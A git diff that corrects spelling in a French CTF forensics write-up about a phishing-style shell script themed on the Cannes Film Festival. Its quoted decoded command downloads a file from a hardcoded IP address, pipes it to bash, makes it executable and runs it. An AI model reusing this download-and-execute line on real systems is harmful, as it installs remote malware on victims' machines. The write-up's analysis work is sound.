@@ -6,7 +6,7 @@ Dans ce challenge, on nous fournit une copie du filesystem du PC infecté que l'
 
 ![fs](images/fs.png)
 
-Il est indiqué que le groupe d'attaquants a utilisé le Festival de Cannes pour compromettre l'entreprise, en cherchant dans les dossiers, on trouve un shell script `tirage_aux_sorts.sh` dans le fichier de téléchargement de l'utilisateur **cesar** qui parle du Festival.
+Il est indiqué que le groupe d'attaquants a utilisé le Festival de Cannes pour compromettre l'entreprise, en cherchant dans les dossiers, on trouve un script Shell `tirage_aux_sorts.sh` dans le fichier de téléchargement de l'utilisateur **cesar** qui parle du Festival.
 
 Nous pouvons extraire pour analyse plus approfondi :
 
@@ -19,7 +19,7 @@ En ouvrant ce fichier dans Visual Studio Code, on se rend compte qu'il fait 1000
 ![malcommand](images/malcommand.png)
 
 
-En effet ce script est malveillant, voici la commande décodée qu'il éxécute :
+En effet ce script est malveillant, voici la commande décodée qu'il exécute :
 
 ```
 wget -q http://57.128.85.25:50098/_ -O /tmp/._ | bash && chmod +x /tmp/._ && /tmp/._
@@ -29,9 +29,9 @@ On inspecte donc le dossier /tmp pour voir si le fichier `._` est présent :
 
 ![tmp](images/tmpfolder.png)
 
-L'éxécutable est présent ainsi que par déduction son fichier de config, `config.bin`
+L’exécutable est présent ainsi que par déduction son fichier de config, `config.bin`
 
-On recupère le hash du malware :
+On récupère le SHA-256 du malware :
 
 ```
 [Jun 30, 2025 - 03:08:20 (CEST)] exegol-Shutlock tmp # sha256sum ._
